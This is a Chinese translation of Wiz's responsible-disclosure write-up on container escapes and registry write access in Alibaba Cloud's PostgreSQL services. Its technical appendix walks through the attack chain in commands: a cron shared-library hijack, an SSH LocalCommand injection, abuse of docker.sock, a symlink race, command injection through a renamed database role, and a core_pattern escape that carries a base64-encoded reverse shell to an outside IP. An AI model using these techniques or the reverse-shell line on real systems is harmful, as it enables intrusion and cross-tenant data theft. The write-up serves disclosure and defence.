> 原文链接：https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-> private-registry-allowed-potential-r#privilege-escalation
>
> 一个容器逃逸漏洞，加上对私有注册表的意外“写入”权限，
>
> 为 Wiz 机构 打开了访问阿里云数据库的后门，并可能通过供应链攻击危及其服务

## 长话短说

`Wiz`机构 在阿里云的两个热门服务 `ApsaraDB RDS for PostgreSQL `和 `AnalyticDB for
PostgreSQL`中发现了一系列严重漏洞。这些被称为`#BrokenSesame`的漏洞可能允许未经授权访问阿里云客户的
`PostgreSQL`数据库，并能够对阿里巴巴的两个数据库服务执行供应链攻击，从而导致 **对阿里巴巴数据库服务的 RCE** 。

这项研究证明了每个安全团队都应该意识到的两个关键风险：

  1. 多租户应用程序中隔离不充分的风险——利用容器级别的一些不安全行为，我们能够逃逸到 `K8s`节点并在 `K8s`集群中获得高权限。这反过来又允许我们访问其他租户的数据库，从而可能危及服务的所有用户。

  2. 容器注册表写入权限范围不当的风险——一旦我们破坏了 `K8s`节点，我们检查了用于从阿里云私有容器注册表中提取镜像的已配置凭据的权限。由于严重的错误配置，凭据还具有对注册表的写入权限。这意味着我们有能力覆盖阿里云使用的中央镜像仓库中的容器镜像，并有可能对阿里云数据库服务进行大规模的供应链攻击。

在此博客中，我们详细回顾了攻击流程，并回顾了对安全团队的建议，以防止类似的风险。

`Wiz`机构 于 2022 年 12
月负责任地向阿里云披露了#BrokenSesame。阿里云确认问题已得到充分缓解；没有客户数据被泄露，客户也不需要采取任何行动。

## 介绍

作为我们发现云隔离问题的努力的一部分，我们深入研究了阿里巴巴的两个流行的云服务：`ApsaraDB RDS for PostgreSQL`和
`AnalyticDB for PostgreSQL`。`ApsaraDB
RDS`是一种托管数据库托管服务，具有自动监控、备份和灾难恢复功能。同时，`AnalyticDB for PostgreSQL`是一种托管数据仓库服务。

正如我们进行的每项云隔离研究一样，目标是确定攻击者如何绕过云服务商设置的安全边界并获得对其他客户数据的访问权限，这是一个影响许多托管服务服务商的重大问题。

我们之前的研究，最著名的是`ExtraReplica`和`Hell's Keychain`，都是从利用跨多个云服务商发现的
`PostgreSQL`漏洞开始的。在本次研究中，我们同样发现`ApsaraDB
RDS`和`AnalyticDB`都存在类似的`PostgreSQL`漏洞，而且都是多租户服务，因此成为我们研究的理想对象。

然而，这篇博客不会关注 `PostgreSQL`漏洞本身，而是关注我们在这两个服务中发现的隔离问题。

## Kubernetes 中的多租户

我们在进行云隔离研究的时候，有时希望在服务基础设施本身进行横向移动，以达到更大的影响。这为我们提供了一个独特的机会来检查这些服务如何从内部工作。在我们对云服务商的研究中，我们注意到许多云服务商在创建多租户托管服务时使用协调器。由于管理这些大规模环境可能很困难，因此像阿里云这样的云服务商使用
`Kubernetes`进行多租户，因为它简化了管理和维护过程。

然而，成功实施多租户需要云服务商有效地隔离每个租户的资源，这不是一项简单的任务，因为所有资源都以某种方式相互关联。容器之间的网络连接、不正确的权限管理或不完善的容器隔离等任何错误配置都可能提供对其他租户资源的未授权访问。

我们在这些研究中的发现说明了组织在使用 `Kubernetes`时应该注意的实际安全问题。

## 攻击流程

在下一节中，我们将简要概述攻击流程。有关全面的技术信息，请参阅位于本博文末尾的附录。

我们的研究始于通过使用过去发现的 `PostgreSQL`漏洞在数据库实例上执行代码。然后我们意识到我们的容器是在
`K8s`环境中运行的。在这种环境下，我们通常会尝试利用 `K8s
API`服务器来获取有关集群的信息并在其中执行操作。不幸的是，我们的容器无法直接通过网络访问 `K8s API`服务器。这迫使我们将研究重点放在以下步骤上：

  * 提升我们在容器内的权限和/或向具有更多功能的容器执行横向移动。

  * 逃逸到底层主机（`K8s `节点）以获取对 `K8s API`服务器的访问权限。

这正是我们所做的。

### 用于 PostgreSQL 的分析型数据库

  1. 我们利用 `cronjob`任务中的权限提升漏洞将我们的权限提升到容器内的 `root`权限。

  2. 由于我们的能力仍然有限，我们通过利用 **共享的 PID 命名空间** 横向移动到 `pod`中的特权相邻容器，使我们能够逃逸到底层主机（`K8s`节点）。

  3. 进入节点后，我们利用强大的`kubelet`凭据访问敏感资源，包括密钥、服务帐户和 `pod`。

  4. 在检查 `pod`列表时，我们发现属于同一集群中其他租户的 `pod`。这表明阿里云将该集群用于多租户目的，这意味着我们有可能获得对这些 `pod`的跨租户访问。

  5. 由于阿里云使用私有容器镜像存储库，我们获得了访问它的必要凭证，并因此检查了它们的权限。

  6. 在针对容器镜像注册表测试凭据后，我们发现我们不仅具有读取权限，而且还具有写入权限。这意味着我们有能力覆盖容器镜像，并可能对整个服务和其他服务的镜像进行供应链攻击。

### ApsaraDB RDS for PostgreSQL

  1. 我们利用了一个漏洞，使我们能够访问 `pod`中相邻管理容器的源代码。

  2. 在我们对管理容器的源代码审计期间，我们发现了一个远程代码执行 (`RCE`) 漏洞，我们利用了相邻容器。后来我们发现这个容器是有权限的，可以让我们逃到宿主机（`K8s`节点）。

  3. 经过对节点的基本侦察，我们了解到阿里云再次使用了多租户集群。我们随后在我们的节点上发现了属于其他租户的数据库，这可能使我们能够访问他们的数据。

  4. 用于此服务的私有容器注册表存储库与用于 `AnalyticDB`的相同，这意味着我们可以使用 `AnalyticDB`的凭证对 `ApsaraDB RDS`进行供应链攻击！

## 安全团队的经验教训

这项研究定义了几个使我们能够进行这些攻击的基本错误；这些陷阱与其他跨租户研究中发现的陷阱相似。借鉴这个案例，以及我们之前在`Hell's
Keychain`研究中获得的 `Kubernetes`多租户环境经验，我们现在能够查明这些核心问题，并为构建此类服务的人提供更多见解。

  * Linux 容器之间的隔离

在设计具有多个容器的服务时，至关重要的是要准确地确定它们应该如何协同工作——如果有的话——以及这种交互可能带来的安全隐患。在 `ApsaraDB RDS`和
`AnalyticDB`中，我们的数据库容器与 `K8s pod`中的其他操作容器共享不同的 `Linux`命名空间。具体来说，它们共享
`PID`命名空间，这允许我们的容器访问操作容器和文件系统中的其他进程。这个错误是致命的： **它使我们能够对操作容器进行横向移动，从而逃离我们的容器！**

  * Linux 容器作为安全屏障

在 `ApsaraDB RDS`案例研究中，`Linux`容器是分隔客户数据库的唯一安全屏障，因为
`K8s`节点托管多个客户的数据库（这并不理想）。如果对手设法执行了容器逃逸，他们就可以访问其他客户的数据。`Linux`容器是一个合法的安全屏障，尽管还不够。服务构建者应该考虑使用像
`Gvisor`或 `Kata`容器这样的项目来阻止逃逸。阿里云的解决方案是使用其内部的容器加固方案。

  * 过度宽容的身份

在`ApsaraDB RDS`和`AnalyticDB`中，由于`K8s`集群是多租户的，`kubelet`服务账号权限过高，可以访问其他租户的资源。确定
`kubelet`权限的范围对于限制对手访问至关重要，尤其是当他们已经逃脱了他们的专用容器实例时。作为对我们报告的回应，阿里云将
`kubelet`权限限制在最低限度，以更好地将节点与其他资源隔离。

> 译者注：容器权限主要是由`linux
> capabilities`来配置，默认是够安全，但在大型网络使用，特别多租户，以`capabilities`的复杂性，可能会出现一些问题，阿里云的人估计背过锅，才降低的。

  * 非范围容器注册表凭据

云服务商倾向于使用他们自己的私有容器注册表来在 `K8s`环境中托管容器镜像。为此，`K8s`节点必须可以访问注册表凭据，以便它可以拉取必要的镜像。在
`ApsaraDB RDS`和
`AnalyticDB`的案例中，阿里云也使用了自己的容器注册中心。但是，我们发现用于拉取镜像的凭据没有正确限定范围并允许推送权限，为供应链攻击奠定了基础。阿里云的解决方案是将
`registry`用户权限限定为仅拉取操作。

  * 环境干净问题与保密管理不当

`AnalyticDB`服务中的
`K8s`节点基础镜像包含构建过程中遗留的敏感密钥。这个卫生问题对于租户隔离至关重要：一次密钥泄漏可能使攻击者能够破坏内部服务资源并在服务云环境中执行横向移动。阿里云不仅删除了节点上的所有secret，还轮换了所有secret并限制了权限。

## 结论

通过这项研究，我们展示了 `AnalyticDB for PostgreSQL`和 `ApsaraDB RDS for
PostgreSQL`中的漏洞利用如何导致未经授权的跨租户访问客户的
`PostgreSQL`数据库和供应链攻击。这项研究从攻击者的角度进行，提供了一个独特的视角，并强调了租户隔离作为托管服务和整个云的重要组成部分的重要性。我们希望未来类似的研究能够提高人们对这些问题的认识，并从长远来看帮助云构建者创建更安全的云环境。

## PEACH框架

在过去的一年里，`Wiz `参与了一个名为`PEACH`的项目。`PEACH`是一个循序渐进的框架，用于通过管理用户界面暴露的攻击面来建模和改进
`SaaS`和 `PaaS`租户隔离。无论您是云客户还是云应用程序开发人员，`PEACH`都能让您更轻松地了解应如何在云中保护多租户应用程序。

## 负责任的披露

我们于 2022 年 12
月向阿里云披露了漏洞。阿里云及时调查并通过实施新的缓解措施解决了该问题。阿里云安全团队告诉我们，他们当时已经识别并监控了我们的活动，并立即采取相关措施将风险降至最低，并且没有发现任何证据表明阿里云系统或服务被其他方利用。日志分析还表明，所有相关活动都与我们的研究人员有关。

我们赞扬阿里云在处理我们的报告时的合作和响应。他们在整个披露过程中的专业操守和坦诚沟通为其他供应商树立了榜样。

## 披露时间表

01/11/2022 – Wiz 机构 开始阿里云研究。

12/11/2022 – 阿里云修复了一个 `PostgreSQL`漏洞。

04/12/2022 – Wiz 向阿里云报告了影响 `ApsaraDB RDS for PostgreSQL`和 `AnalyticDB for
PostgreSQL`的漏洞。

05/12/2022 – 阿里云安全团队回复称，他们在研究期间正在监控我们的活动，并采取了积极主动的方法，并且已经修复了一些漏洞。

08/12/2022 – `Wiz`和阿里云安全团队讨论了针对尚未修复的漏洞的缓解思路。

24/02/2023 – 阿里云安全团队与 `Wiz`测试实例共享以验证修复。

12/04/2023 – 阿里云部署了所有缓解措施。

## 保持联系！

你好呀！我们是来自 `Wiz`研究团队 (`@wiz_io`) 的 `Shir Tamari (@shirtamari)`、`Nir Ohfeld
(@nirohfeld)`、`Sagi Tzadik (@sagitz_)`、`Ronen Shustin (@ronenshh)`和 `Hillai
Ben-Sasson
(@hillai)`。我们是一群经验丰富的白帽黑客，他们的目标只有一个：让云成为每个人都更安全的地方。我们主要专注于在云中寻找新的攻击媒介并发现云供应商中的隔离问题。我们很想听到您的声音！请随时通过
Twitter 或电子邮件与我们联系：机构`@wiz.io`。

或者注册接收我们的每月研究通讯。

## 附录：技术细节

下一节按时间顺序描述技术细节。欢迎您使用左侧的目录浏览不同的阶段。

### 用于 PostgreSQL 的分析型数据库

  * 特权升级

我们首先探索在数据库容器中将我们的权限提升到 root 的方法。在我们最初的侦察中，我们发现了一个
`cronjob`任务，该任务每分钟运行一次二进制文件`/usr/bin/tsar`并具有 `root`权限。

    
    
    $: ls -lah /etc/cron.d/tsar   
    -rw-r--r-- 1 root root 99 Apr 19  2021 /etc/cron.d/tsar   
      
    $: cat /etc/cron.d/tsar   
      
    # cron tsar collect once per minute   
    MAILTO=""   
    * * * * * root /usr/bin/tsar --cron > /dev/null 2>&1

`ldd`在`tsar`上执行命令显示它从自定义位置加载共享库，`/u01`该目录对`adbpgadmin`用户来说是可写的 。

![图片](https://image.3001.net/images/20230421/1682068657_644254b152f5a182982bf.jpeg!small)

我们列出了`libgcc_s.so.1`的所有者，发现它归我们的用户`adbpgadmin`所有，可以被覆盖！

    
    
    $: ls -alh /u01/adbpg/lib/libgcc_s.so.1   
    -rwxr-xr-x 1 adbpgadmin adbpgadmin 102K Oct 27 12:22 /u01/adbpg/lib/libgcc_s.so.1 

这意味着如果我们可以用我们自己的共享库覆盖这个文件，那么下次 `cronjob`任务执行二进制文件时，我们库的代码将以 `root`身份执行！

为了利用这种行为，我们遵循了以下步骤：

  1. 编译了一个共享库，它将复制`/bin/bash`到`/bin/dash`, 并加 `SUID`，这样我们就可以以 `root`身份执行代码。

  2. 使用`PatchELF`实用程序向库`libgcc_s.so.1`添加依赖项。这样当它被加载时，我们自己的库也会被加载。

  3. 覆盖了原来的`libgcc_s.so.1`库。

  4. 等待`/usr/bin/tsar`执行。

我们的策略最终成功了，授予我们 `root`访问权限。

  * 容器逃逸到宿主机（K8s节点）

尽管我们成功提升了权限，但我们缺乏执行容器逃逸的能力。

在过去一年调查多个云服务商的托管服务时，我们发现客户从管理门户执行的操作通常会导致在托管环境中创建各种容器和进程，从而可能扩大横向移动的攻击面。

通过调用阿里云门户中的某些操作（例如启用 `SSL`加密），我们观察到 `SCP`和 `SSH`等多个进程的产生。

![图片](https://image.3001.net/images/20230421/1682068682_644254ca97185f51bbbaf.jpeg!small)

    
    
    # Command lines of the spawned processes  
    su - adbpgadmin -c scp /home/adbpgadmin/xxx_ssl_files/*   
    *REDACTED*:/home/adbpgadmin/data/master/seg-1/   
      
    /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes   
    -- *REDACTED* scp -d -t /home/adbpgadmin/data/master/seg-1/ 

一些生成的进程在它们的命令行中包含我们的容器中不存在的路径。我们推断这些进程是在与我们的容器共享
`PID`命名空间的不同容器中生成的。为了验证这一理论，我们编写了一个 `Python`脚本，等待
`SCP`进程生成（因为它与我们的用户`adbpgadmin`一起运行），然后使用路径`/proc/{pid}/root/`访问其文件系统:

    
    
    # The Python script we used to access the second container filesystem  
    import psutil   
    import os   
    listed = set()   
    while True:   
    for proc in psutil.process_iter():   
    try:   
    processName = proc.name()   
    processID = proc.pid   
    cmdLine = proc.cmdline()   
    if processID not in listed and processName == 'scp':   
    os.system('ls -alh /proc/{}/root/'.format(processID))   
      
    listed.add(processID)   
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):  
    pass 

再次重新启用
`SSL`操作后，`SCP`进程产生，我们的脚本让我们访问它的文件系统。我们很高兴我们的假设是正确的，并且该进程确实在第二个容器中运行。使用这种方法，我们对第二个容器进行了更多的信息收集，并得出结论，虽然两个容器不同，但它们的主目录
( `/home/adbpgadmin`) 是相同的挂载！

> 译者注：`mount`命名空间也共享！！！

为了在第二个容器中执行代码，我们想到了一个有趣的想法。由于每次我们重新启用 `SSL`操作并共享主目录时都会执行 `SSH`命令，因此我们可以修改本地
`SSH`客户端配置文件`/home/adbpgadmin/.ssh/config`. 通过这样做，我们可以将`LocalCommand`字段配置为在下一次
`SSH`命令执行期间执行我们自己的任意命令。

这是我们使用的 SSH 客户端配置示例：

![图片](https://image.3001.net/images/20230421/1682068694_644254d673374a07ce3e1.jpeg!small)

覆盖`SSH`客户端配置后，我们通过阿里云门户再次调用`SSL`动作。我们观察了`SSH`进程的产生，我们的命令是以第二个容器中的用户`adbpgadmin`执行的！

然后我们将 `SUID`二进制文件复制到共享主目录，这样我们就可以在第二个容器中以 `root`身份执行代码。

新的 `SSH`客户端配置，它使用 `SUID`二进制文件在第二个容器中以 `root`身份执行代码

![图片](https://image.3001.net/images/20230421/1682068713_644254e9768f8c890452b.jpeg!small)

在成功地对第二个集装箱进行横向移动后，我们可以从这个新位置完成什么？

在检查第二个容器的功能后，我们意识到它具有特权。此外，我们发现 `Docker Unix socket`( `/run/docker.sock`)
可从容器访问，这是容器转义技术中使用的已知元素。

鉴于第二个容器只是为操作（启用 `SSL`加密）临时创建的，我们利用公开的 `Docker Unix
socket`来运行一个新的持久性特权容器。该容器将与主机（`K8s`节点）共享相同的 `PID、IPC、UTS、NET、USER `和
`MOUNT`命名空间，主机根目录安装在`/mnt`.
它将无限期地继续存在，并通过位于`/home/adbpgadmin`的共享管道从我们的非特权容器接收命令。

生成新的“超级”容器使我们能够逃脱到主机（`K8s`节点）并最终到达 `K8s API`，因为我们现在共享相同的网络命名空间。我们还能够通过调用反向
`shell`来避免使用共享命名管道，因为主机允许出站连接到 `Internet`。这是一项重大的研究成果！

有关使用`docker.sockAPI`的更多信息，请参阅本指南。

    
    
    # Code execution inside the new privileged container   
    $: echo ‘id’ > /home/adbpgadmin/i_pipe; timeout 1 cat /home/adbpgadmin/o_pipe   
    uid=0(root) gid=0(root) groups=10(wheel)   
      
    # Accessing the host filesystem from the new privileged container  
    $: echo ‘ls -alh /mnt’ > /home/adbpgadmin/i_pipe; timeout 2 cat /home/adbpgadmin/o_pipe   
    total 88   
    dr-xr-xr-x   23 root     root        4.0K Nov  6 10:07 .   
    drwxr-xr-x    1 root     root        4.0K Nov  7 15:54 ..   
    drwxr-x---    4 root     root        4.0K Nov  6 10:07 .kube   
    lrwxrwxrwx    1 root     root           7 Aug 29  2019 bin -> usr/bin   
    dr-xr-xr-x    5 root     root        4.0K Nov  2 10:21 boot   
    drwxr-xr-x   17 root     root        3.1K Nov  6 10:08 dev   
    drwxr-xr-x   84 root     root        4.0K Nov  6 10:08 etc   
    drwxr-xr-x    3 root     root        4.0K Nov  2 10:24 flash   
    drwxr-xr-x    6 root     root        4.0K Nov  6 10:11 home   
    drwxr-xr-x    2 root     root        4.0K Nov  2 10:24 lafite   
    lrwxrwxrwx    1 root     root           7 Aug 29  2019 lib -> usr/lib   
    lrwxrwxrwx    1 root     root           9 Aug 29  2019 lib64 -> usr/lib64   
    drwx------    2 root     root       16.0K Aug 29  2019 lost+found   
    drwxr-xr-x    2 root     root        4.0K Dec  7  2018 media   
    drwxr-xr-x    3 root     root        4.0K Nov  6 10:07 mnt   
    drwxr-xr-x   11 root     root        4.0K Nov  6 10:07 opt   
    dr-xr-xr-x  184 root     root           0 Nov  6 10:06 proc   
    dr-xr-x---   10 root     root        4.0K Nov  6 10:07 root 

  * 从 `K8s`横向移动到供应链攻击

通过访问`K8s API`服务器，我们利用节点的`kubelet`凭证来检查各种集群资源，包括密钥、服务帐户和 `pod`。在检查
`pod`列表时，我们发现属于同一集群中其他租户的 `pod`。这表明阿里云为多租户设计了集群，这意味着我们有可能获得对这些 `pod`跨租户的访问。

    
    
    # Listing the pods inside the K8s cluster  
    $: /tmp/kubectl get pods   
    NAME                                                                       READY   STATUS      RESTARTS   AGE   
    gp-4xo3*REDACTED*-master-100333536                                      1/1     Running     0          5d1h   
    gp-4xo3*REDACTED*-master-100333537                                      1/1     Running     0          5d1h   
    gp-4xo3*REDACTED*-segment-100333538                                     1/1     Running     0          5d1h   
    gp-4xo3*REDACTED*-segment-100333539                                     1/1     Running     0          5d1h   
    gp-4xo3*REDACTED*-segment-100333540                                     1/1     Running     0          5d1h   
    gp-4xo3*REDACTED*-segment-100333541                                     1/1     Running     0          5d1h   
    gp-gw87*REDACTED*-master-100292154                                      1/1     Running     0          175d   
    gp-gw87*REDACTED*-master-100292155                                      1/1     Running     0          175d   
    gp-gw87*REDACTED*-segment-100292156                                     1/1     Running     0          175d   
    gp-gw87*REDACTED*-segment-100292157                                     1/1     Running     0          175d   
    gp-gw87*REDACTED*-segment-100292158                                     1/1     Running     0          175d   
    gp-gw87*REDACTED*-segment-100292159                                     1/1     Running     0          175d   
    ... 

我们还决定调查容器注册表的密钥，因为阿里云使用他们的私有存储库来托管 `K8s`容器镜像。

    
    
    # A snippet of the pods configuration, illustrating the use of a private container registry   
      
    "spec": {   
    "containers": [   
    {   
    "image": "*REDACTED*.eu-central-1.aliyuncs.com/apsaradb_*REDACTED*/*REDACTED*",   
    "imagePullPolicy": "IfNotPresent",   
    ...              
    "imagePullSecrets": [   
    {   
    "name": "docker-image-secret"   
    }   
    ], 

为了在 `K8s`中使用私有容器注册表，需要通过配置中的 `imagePullSecret`字段提供凭证。

提取这个密钥允许我们访问这些凭据并根据容器注册表测试它们！

    
    
    # Retrieving the container registry secret  
    $: /tmp/kubectl get secret -o json docker-image-secret   
    {   
    "apiVersion": "v1",   
    "data": {   
    ".dockerconfigjson": "eyJhdXRoc*REDACTED*"   
    },   
    "kind": "Secret",   
    "metadata": {   
    "creationTimestamp": "2020-11-12T14:57:36Z",   
    "name": "docker-image-secret",   
    "namespace": "default",   
    "resourceVersion": "2705",   
    "selfLink": "/api/v1/namespaces/default/secrets/docker-image-secret",   
    "uid": "6cb90d8b-1557-467a-b398-ab988db27908"   
    },   
    "type": "kubernetes.io/dockerconfigjson"   
    }   
      
    # Redacted decoded credentials  
    {   
    "auths": {   
    "registry-vpc.eu-central-1.aliyuncs.com": {   
    "auth": "*REDACTED*",   
    "password": "*REDACTED*",   
    "username": "apsaradb*REDACTED*"   
    }   
    }   
    } 

在针对容器映像注册表测试凭据后，我们发现我们不仅具有读取权限，而且还具有写入权限。这意味着我们有能力覆盖容器镜像，并可能对整个服务和其他服务的镜像进行供应链攻击。

例如，我们可以覆盖`rds_postgres_*REDACTED*`属于另一个服务的镜像。

![图片](https://image.3001.net/images/20230421/1682068732_644254fc676e622dc4331.jpeg!small)

  * 环境卫生问题

与我们进行的所有研究一样，我们尝试对文件系统进行秘密扫描，以查看我们是否可以检索任何访问密钥、私钥等，因为环境卫生不佳可能会引发更具破坏性的攻击。对节点的秘密扫描揭示了各种日志文件（包括该`.bash_history`文件）中的多个访问密钥。

    
    
    /etc/*REDACTED*/custins/400480085/100333829/custins_job:LTAIALrh*REDACTED*gi   
    /opt/*REDACTED*/golang_extern_backend_sls.conf:LTAI4Fo*REDACTED*5kJ   
    /root/.bash_history:LTAI4FrP*REDACTED*NTqkX   
    /var/lib/*REDACTED*/data/errors-1182678.txt:LTAI4G4*REDACTED*Ujw3y   
    /var/lib/docker/containers/1085d3b04fed29011705ca6d277525bbde342dbc036a605b6ecb74531b708543/config.v2.json:LTAI4Fdepc*REDACTED*v1R 

### ApsaraDB RDS for PostgreSQL

在对 `AnalyticDB`进行研究之后，我们的目标是通过 `ApsaraDB RDS`服务复制它的影响。对我们的 `ApsaraDB RDS
PostgreSQL`实例容器的侦察揭示了与 `AnalyticDB`不同的环境。因此，我们需要寻找新的漏洞来逃脱容器并获得对底层主机的访问权限。

    
    
    $: id   
    uid=1000(alicloud_rds_admin) gid=1000(alicloud_rds_admin) groups=1000(alicloud_rds_admin) 

  * 原始文件泄露

在浏览数据库容器中的文件时，我们偶然发现了目录`/tmp/tools_log`。它包含一个奇怪的文件：

    
    
    $: ls -alh /tmp/tools_log   
    total 2.4M   
    drwxrwxrwx 2 root root 4.0K Nov 10 08:55 .   
    drwxrwxrwx 5 root root 4.0K Nov 16 23:07 ..   
    -rwxrwxrwx 1 root root 2.4M Nov 16 23:07 docker_tools.log

我们意识到这是属于另一个容器的操作日志，负责对我们的数据库容器执行某些操作。这揭示了容器的性质，并提供了有用的信息，例如文件路径。

> 译者注：又是一个共享`mount`命名空间的问题

然后，我们在阿里云门户中搜索有趣的功能以利用 `AnalyticDB`，并偶然发现了废弃文件配置。在幕后，它触发了这些日志：

![图片](https://image.3001.net/images/20230421/1682068762_6442551af00c08923bf0d.jpeg!small)

以红色突出显示的是显示`sed`命令执行的日志。尽管这些`sed`命令是在第二个容器中执行的，但它们对与我们的数据库容器共享的配置文件`/data/pg_hba.conf`进行了修改。

对于那些不熟悉`sed
-i`命令的人，它的工作原理是首先将目标文件复制到一个临时位置，使用正则表达式进行所需的修改，然后将编辑后的文件移回其原始位置。我们发现可以通过符号链接攻击利用此行为从第二个容器复制文件。

要执行此攻击，我们需要使用符号链接将配置文件`/data/pg_hba.conf`替换为对第二个容器中所需文件的引用。点南阿里云门户中的“撤销列表”功能会在第二个容器中启动命令`sed
-i`，并用第二个容器中的所需文件覆盖`/data/pg_hba.conf`。

在下面的示例中，我们创建了一个符号链接`k8s_ctx.py`（我们从日志中检索了它的路径）。

    
    
    $: unlink pg_hba.conf; ln -s *REDACTED*/operator/k8s_ctx.py pg_hba.conf 

我们随后更新了阿里云门户中的“撤销列表”，并观察了文件`pg_hba.conf`的变化。当我们读取它时，我们可以看到我们想要的文件的内容！

    
    
    # Reading a file from the second container  
    $: cat pg_hba.conf    
    import os   
    import pwd   
    from *REDACTED*/operator.utils.envs import ToolImageEnv   
    from *REDACTED*/operator.k8s_ctx import db_ctx_pgsql_config, db_ctx_pgsql_database, db_ctx_pgsql_replica, \   
    db_ctx_pgsql_system, db_ctx_pgsql_switch   
    … 

对 `Python `文件中的任何导入重复此操作使我们能够获得在第二个容器中运行的完整 `Python`源代码，从而生成新的攻击面。

源代码表明，几乎所有对我们数据库的管理操作都会创建一个具有相同代码的新容器，其操作由传递给它的环境变量决定。这些信息在我们逃逸到主机时非常有用。

  * 利用RCE并逃逸到主机（K8s节点）

阿里云提供了一项功能，可以在继续进行选定的升级之前验证 PostgreSQL 实例是否可以升级到较新的版本。这是为了避免损坏数据库。

![图片](https://image.3001.net/images/20230421/1682068775_644255278fc8b10258d69.jpeg!small)

我们在检索到的代码中审核了此功能，发现了一个命令行注入漏洞，该漏洞允许我们在负责此操作的容器中执行代码。

这是易受攻击的功能：

![图片](https://image.3001.net/images/20230421/1682068787_6442553331be2a38db93f.jpeg!small)

该参数`install_user`未经任何清理就被格式化为命令行；该命令稍后以`root`权限执行！但我们能控制`install_user`吗？是的，它是通过以下查询从我们的数据库中选择的：

    
    
    select rolname from pg_authid where oid=10; 

此查询返回 `PostgreSQL`超级用户角色名称，即数据库的管理员用户名。

由于阿里云使用了`alicloud_rds_admin`作为该服务超级用户的角色名称，我们执行了以下操作以在负责“版本升级检查”的容器内执行代码：

  1. 通过阿里云门户开始版本升级检查。

  2. 使用 `ALTER ROLE`语句将 `PostgreSQL``用户名alicloud_rds_admin`更改为命令行注入：`"ALTER ROLE \"alicloud_rds_admin\" RENAME TO \"\`id`";" `

  3. 等待 5 秒让进程完成。

  4. 找回了用户名。

虽然我们在开始时对用户名有一些长度限制，但这个流程运行得很好，我们设法在“版本升级检查”容器中以 `root`身份执行代码！

鉴于此容器具有特权，我们可以使用`core_pattern`容器转义技术：

  * 如果`/proc/sys`挂载为可写（它是），我们可以覆盖`/proc/sys/kernel/core_pattern`，它定义了一个命名核心转储文件的模板。

  * `/proc/sys/kernel/core_pattern`的语法允许通过“|”字符将核心转储管道传输到程序。由于`core_pattern`与主机共享，因此在发生崩溃时程序将在主机上执行。这将允许容器逃逸。

幸运的是，我们满足了这项技术的所有条件。我们`core_pattern`用 `bash`反向 `shell`（以 `base64`编码）覆盖了：

    
    
    echo '|/bin/bash -c   
    echo${IFS%%??}L2Jpbi9iYXNoIC1pPiYvZGV2L3RjcC8yMC4xMjQuMTk0LjIxMi82MDAwMSAwPiYxCg==|base64${  
    IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern 

回到我们的 `PostgreSQL`容器，我们所要做的就是让我们的进程崩溃：

    
    
    $: sh -c 'kill -11 "$$"' 

我们从主机（`K8s`节点）获得了一个反向 `shell`！

    
    
    [root@i-gw80v6j*REDACTED* /]   
      
    $: id   
    uid=0(root) gid=0(root) groups=0(root) 

  * K8s 跨租户访问

与 `AnalyticDB`一样，我们利用强大的`kubelet`凭证来收集集群信息。

我们列出了所有的
`pod`，并观察到租户的几个数据库位于同一个节点上。就在那时我们意识到我们的节点正在托管多个租户。我们注意到这一点，就立即停止了研究，并避免访问其他客户的数据。

    
    
    # Other customers’ data mounted on our node  
    $: mount | grep -i /mount | grep -ioE 'pgm-(.*?)/' | sort | uniq   
    pgm-*REDACTED*-data-19d1322c/   
    pgm-*REDACTED*-data-15c361da/   
    pgm-*REDACTED*-data-38f60684/   
    pgm-*REDACTED*-data-61b4d30a/   
    pgm-*REDACTED*-data-0197fb99/   
    pgm-*REDACTED*-data-0fa7676b/   
    pgm-*REDACTED*-data-52250988/   
    pgm-*REDACTED*-data-8d044ffb/   
    pgm-*REDACTED*-data-09290508/   
    pgm-*REDACTED*-data-bc610a92/   
    pgm-*REDACTED*-data-d386ec2d/   
    pgm-*REDACTED*-data-ed5993d7/   
    pgm-*REDACTED*-data-a554506c/   
    pgm-*REDACTED*-data-d99da2be/ 

我们对 `AnalyticDB`和 `ApsaraDB RDS`的研究的技术细节到此结束。

## 译者的狗尾续貂

  * `crontab`的利用可以参照

    * [Linux提权系列9：[训练营]利用 cron 的错误配置1](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247488898&idx=1&sn=e3694af7cbd71ae4e838531b6614efd5&chksm=fdf97e97ca8ef7811a4f1c4eaa6a77ff296a0b6d0058e4e3fc15787469e2a8c458efbf54e977&scene=21#wechat_redirect)

    * [Linux提权系列10：[训练营]利用 cron 的错误配置2](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247488899&idx=1&sn=e8e4385103680d19eb4e11f22654bb98&chksm=fdf97e96ca8ef780ff39d39468f44ba93790e4befe58b22d4024870376e2a0e65760d8965e54&scene=21#wechat_redirect)

  * 库的利用可以参照

    * [Linux提权系列12：[训练营]利用共享库错误配置](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247488931&idx=1&sn=98f10752bfdea4c2c0f8707e9714f53a&chksm=fdf97eb6ca8ef7a0153d0c2aa6a11a45a7fcb6209833e0fe53efb26858e8717e47167594e451&scene=21#wechat_redirect)

    * [Linux提权系列14：[训练营] 利用存在漏洞的应用程序进行权限提升](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247488934&idx=1&sn=57d56a257131f971f035b3dd3f7a6a86&chksm=fdf97eb3ca8ef7a53929120f4ca3c7c0e1501718659a5dc3043212f37e79f332f4d1eebba4d9&scene=21#wechat_redirect)

  * `docker`的逃逸可以参照

    * [linux提权系列25: [训练营]docker逃逸1](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247489228&idx=1&sn=7f6513f04f8d83e664dc68fc39244cac&chksm=fdf97dd9ca8ef4cf94355672e63f6986aae6bca1f6c6d6b193c54886edb9d4672023def10769&scene=21#wechat_redirect)

    * [linux提权系列26: [训练营]docker逃逸2](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247489235&idx=1&sn=67d735faafe807fc547faafb081ee996&chksm=fdf97dc6ca8ef4d0b427e9fbb4f778fc50a0254fb5ca505166e82dcd942050d32ee729b9df6c&scene=21#wechat_redirect)

更多精彩技术文章请关注公众号“奶牛安全”

